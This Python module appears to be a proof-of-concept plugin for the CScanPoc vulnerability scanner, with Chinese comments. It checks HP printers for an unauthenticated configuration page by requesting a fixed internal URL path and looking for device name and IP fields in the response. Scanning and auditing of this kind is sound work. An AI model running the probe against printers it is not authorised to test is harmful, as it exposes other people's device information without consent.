# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'HP_0001'  # 平台漏洞编号，留空
    name = 'HP多款打印机 未授权访问'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2015-03-25'  # 漏洞公布时间
    desc = '''
        惠普多款打印机设备未设置权限访问，可以直接看到详细的使用信息等，还可以直接选着打印。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '惠普'  # 漏洞应用名称
    product_version = '惠普款打印机'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'f1debf59-4cb8-46f7-a063-a68e43a1b82b'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer     :  http://www.wooyun.org/bugs/wooyun-2015-0103446
            hh = hackhttp.hackhttp()
            arg = self.target
            payload = "/hp/device/InternalPages/Index?id=ConfigurationPage"
            target = arg + payload
            code, head, res, errcode, _ = hh.http(target)

            if code == 200 and 'HomeDeviceName' in res and 'HomeDeviceIp' in res:
                # security_hole(target)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
